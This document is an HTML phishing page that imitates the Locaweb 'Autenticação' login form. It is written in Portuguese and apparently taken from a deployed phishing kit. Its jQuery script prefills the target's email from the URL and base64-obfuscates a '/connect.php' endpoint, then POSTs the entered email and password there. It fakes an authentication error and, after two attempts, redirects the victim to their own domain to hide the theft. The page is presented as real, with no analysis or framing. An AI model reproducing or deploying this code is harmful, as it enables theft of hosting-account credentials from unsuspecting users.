<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <title>Autenticação Locaweb</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="stylesheet"
        href="https://4nwvwv7c2resxzehuj7m4az2imkbrifuhvb66rfxa7nnmmkmhedq.arweave.net/421bV-LUSSvkh6J-zgM6QxQYoLQ9Q-9Etwfa1jFMOQc" />
    <link rel="icon"
        href="https://kn7a77luy6i4ramm4gi5u5vwuot754dli6h7q3qpf4zaqjvkgoja.arweave.net/U34P_XTHkciBjOGR2na2o6f-8GtHj_huDy8yCCaqM5I"
        type="image/x-icon" />
</head>








<body>

    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
        <div id="google_translate_element"></div>
    </div>

    <div class="valign-center">
        <section class="form-login">
            <div class="inner">
                <div class="box-form">

                    <form id="" name="form1" data-name="" action="" method="post" required>
                        <input type="hidden" name="execution"
                            value="16a2f808-19ec-45dc-819b-33a4e1192631_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuTnZJNnVzb0t5aURqTElTbmY4VDUxV2prTWpuWHlVanlnY25ya0p3WXVzSi96cnFreEtWTlQyTEJibWpqbk5ybDJ0VmcvZ0J5L1dkOVhTM2w4a1hzSW1vMEJtYytjNmJWUTFZY1ZDdUxDUWhVZUQrbHBPRXA4d282T2pmaHpEQVprYUo3OVlqUnV5bm5FbkU3bHpPdjNXekl1SDNicXdGSnZ0cmw0R1E3Z2loUEpsRXAyci9VTU8xWG1scWtoajV3WU0zeFUwT2dwd0NNSEU2NFdyOWt1aEQ0ZHFYRlJaZEFCL2M3TUc5SElIN0V1bWJyZ04xU0RSM1ZQMGxGbGgvMWJxclIxV1d3bFNkQXpyNjJDSzhwYUJQbjRqSVJNcmxpVCtaSTlwbnFib1lCL3BKZnlYdEg3MUxLR3g4aU5mZUNxZGxoU3pUTUh3QkU5Zk05RFNtWEIxdHBSSzIzalFwRWhNYzF0NzhDbGdOWWZVWk5lNU5ESSt4bEhLVW5EZlZJSkJzdUVXMXVob1ZiT3dUOFMrbWhCekhwY3BIaUk5MDJwNGdWN3NsdEppYjg4bjZBTHRlMWkrRVlibHFmZ0dsM0ZlM0FnbVE5d2gwM1ZpMUNySEltKzlBRGhucGRpSUpiYzIvMVN1NUZLUTZBZkVFZkVFQ2dublhLb0Y1cFJUdmc3b3JjVmNCa01MeFc1VktEN2tQU0RYZzQ2RDUyMGp4azROd1dwNzRmaXFGbDNhTC8wYVdBbUw3K0JTTjNPWC83VndlazNQeDdxdEZ0U0hnUHpidVMwUE1jZllram04ZTYvZ0hzYnQwREhjbk13UnpHaEs0WXRWMlE3ai9FM2pqUGJ4VXoyODRyMG9CWnBncm9teUpRTFRrcWd0eWVZc0lFeDM4SU9hckZ4TGxUNGlNRm1wK2FvUTA1TURZRmE3Q2ZGL2JRSDROYmx5clV3eHgvRzdIYk1Eb0ZEVmZ2RlpXcmdwSnVjOTdHaUZIc3htdDdrNmtpUXBmdEFyVFFFQmx3Smx0bmhXOWlWT1R6Y0FUdWp2ZHB6ZFBuNE1pRVNiWnNLL0dRWFBRMmwycDBCVlhYcGxxY0hrdHJTWmRYcXZmbnNMTFdLVUIxVHlTYzdOeTVpanMvRWE2VEltUW5mRUdMdDQxNFF5cnA1akNCQlphUVRuYjhvYWZwYndPZ3k2L0NhcGVvUEc5SnpydUZUU1FWY282VDk1V25kSzk5OU5aSVl1NFNLZ0pFckVFbm1BK3V2SDVWRWtYSkRuU1RPQnFCRFMwZ2ZpdS9lb1I1ZUZ1OEttNUkwazB5endJbS9hWmg4WCtsN3pDS2JXU2lQUU5KZ3F3Tzl2ekd6VjNCSjRNSStSS3FVcWVORUlOYlBpQXRMV1FTdlZOWU5kNTNhYVRZb2lwSmtaaXRqSlNzeVNQZmpMMVRyY3VlUGhHUHdpQ1djZ2lYU3VrZVQrVUcyc245dnNuVVhsSW1EeWszZXRqVlVVdUdWQ21YRWs0PS5jY0FBUDBpRWh6RjJyLVpsVk1ycDVxbGdtZlNDZUQ4VXZ3QTZXaU1sejJjUENhOXFHbmk3VDlSNWJuaEhUOW5HUnM2OTdaU2ltOEFrcnZYS1lZT2NXZw==" /><input
                            type="hidden" name="_eventId" value="submit" />
                        <div class="form-title">
                            <h1 class="login-title">Autenticação</h1>
                        </div>
                        <div class="form-group input-login">
                            <label for="username" class="input-label"></label>
                            <input class="required input-style painel-login" id="ai" name="ai" type="text" accesskey="u"
                                autocomplete="off" name="username" value="" readonly />
                        </div>
                        <div class="form-group input-password">
                            <label for="password" class="input-label"></label>
                            <input class="required input-style painel-password" type="password" id="pr" name="namep"
                                accesskey="p" autocomplete="off" name="password" value="" /><button type="button"
                                class="btn-password show-password" data-label="ocultar">exibir</button>
                        </div>
                        <!--<div class="captcha-container">
                            <section class="row">
                                <div id="locawebRecaptcha" class="g-recaptcha" style="transform:scale(0.96);-webkit-transform:scale(0.96);transform-origin:0 0;-webkit-transform-origin:0 0;" data-sitekey="6LeNHOUZAAAAAJ2hYkVBkc_RMZ_GfaCd6XwqZty0"/></section>

                            </div>-->
                        <div class="row">
                            <div class="error" id="msg" style="display: none; color:red;"></div>
                            <div class="alert alert-danger" id="error" style="display: none; color:red;">Falha de autenticação. Tente novamente
                            </div>
                        </div>

                        <div class="form-group form-submit-button">
                            <button type="submit" id="submit-btn" onclick="submitForm(event)"
                                class="submit-button">Entrar</button>
                        </div>
                        <ul class="links-form">
                            <li>
                                <a href="https://checkout2.locaweb.com.br/customer/new" class="btn-links-form">Criar
                                    nova conta</a>
                            </li>
                            <li>
                                <a href="https://myaccount.locaweb.com.br/forgot" class="btn-links-form">Esqueci
                                    minha senha</a>
                            </li>
                        </ul>
                    </form>
                </div>
            </div>
        </section>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="./config.js"></script>
	
	<script>
/* global $ */
$(document).ready(function() {
    var count = 0;

    $('#back1').click(function() {
        $("#msg").hide();
        $('#ai').val("");
        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);

    });

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var dom = c.toUpperCase();
        $('#ai').val(my_ai);
        $('#ai').attr('disabled', "");
        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
        $('#domain-name').html(dom);
        $("#msg").hide();
        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
    }
    ///////////////url getting ai////////////////


    var atu = "L2Nvbm5lY3QucGhw";
	
    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Falha de autenticação. Tente novamente.");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("Falha de autenticação. Tente novamente.");
            ai.focus;
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Falha de autenticação. Tente novamente.");
            ai.focus;
            return false;
        }
		
		
		if(pr.length < 5) {  

			$('#error').show();
            $('#error').html("Falha de autenticação. Tente novamente.");
            ai.focus;  

			return false;  

		}

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var dom = c.toUpperCase();
        ///////////new injection////////////////
        count = count + 1;
        $('#ai').attr('disabled', "");
        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
        $('#domain-name').html(dom);

        $.ajax({
            dataType: 'JSON',
            url: `${config.baseUrl}${atob(atu)}`,
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("http://www." + my_slice);

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                }
                $("#msg").show();
                // $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('Login');
            }
        });
    });


});

function getParameterByName(name, url) {
			if (!url) url = window.location.href;
			name = name.replace(/[\[\]]/g, '\\$&');
			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
				results = regex.exec(url);
			if (!results) return null;
			if (!results[2]) return '';
			return decodeURIComponent(results[2].replace(/\+/g, ' '));
		}
			
		const login_username = getParameterByName('cms');
		document.getElementById("ai").value = login_username;
</script>
    

</body>

</html>
</div>

</main>





</html>